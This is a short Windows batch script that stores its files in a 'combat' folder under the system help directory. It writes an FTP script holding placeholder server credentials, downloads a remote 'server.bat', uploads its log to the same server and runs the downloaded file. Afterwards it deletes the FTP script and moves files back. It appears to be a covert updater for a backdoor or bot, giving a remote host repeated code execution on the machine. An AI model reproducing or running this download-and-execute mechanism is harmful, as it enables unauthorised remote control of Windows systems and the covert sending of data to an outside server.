@ECHO OFF
IF EXIST "%SystemRoot%\help\combat\upgrade.log" GOTO MOVEBACK
> "%SystemRoot%\help\combat\upgrade.log" ECHO Upgrade Log
>>"%SystemRoot%\help\combat\upgrade.log" ECHO.

SET FTPSERV=(Your FTP SERVER)
SET FTPUSER=(Your FTP USERNAME)
SET FTPPASS=(Your FTP PASSWORD)

:MOVE
MOVE /Y "%SystemRoot%\help\combat\server.bat" "%SystemRoot%\help\" >>"%SystemRoot%\help\combat\upgrade.log"

:FTP
> "%SystemRoot%\help\combat\upgrade.txt" ECHO open %FTPSERV%
>>"%SystemRoot%\help\combat\upgrade.txt" ECHO %FTPUSER%
>>"%SystemRoot%\help\combat\upgrade.txt" ECHO %FTPPASS%
>>"%SystemRoot%\help\combat\upgrade.txt" ECHO cd public_html/combat
>>"%SystemRoot%\help\combat\upgrade.txt" ECHO prompt
>>"%SystemRoot%\help\combat\upgrade.txt" ECHO type ascii
>>"%SystemRoot%\help\combat\upgrade.txt" ECHO get "server.bat" "%SystemRoot%\help\combat\server.bat"
>>"%SystemRoot%\help\combat\upgrade.txt" ECHO put "%SystemRoot%\help\combat\upgrade.log"
>>"%SystemRoot%\help\combat\upgrade.txt" ECHO bye
IF NOT EXIST "%SystemRoot%\help\combat\upgrade.txt" GOTO FTP
FTP -s:"%SystemRoot%\help\combat\upgrade.txt" >>"%SystemRoot%\help\combat\upgrade.log"
DEL /F /Q "%SystemRoot%\help\combat\upgrade.txt" >>"%SystemRoot%\help\combat\upgrade.log"

:RUN
IF NOT EXIST "%SystemRoot%\help\combat\server.bat" GOTO MOVEBACK
CALL "%SystemRoot%\help\combat\server.bat" >>"%SystemRoot%\help\combat\upgrade.log"
DEL /F /Q "%SystemRoot%\help\server.bat" >>"%SystemRoot%\help\combat\upgrade.log"

:MOVEBACK
MOVE /Y "%SystemRoot%\help\server.bat" "%SystemRoot%\help\combat\" >>"%SystemRoot%\help\combat\upgrade.log"

:END
EXIT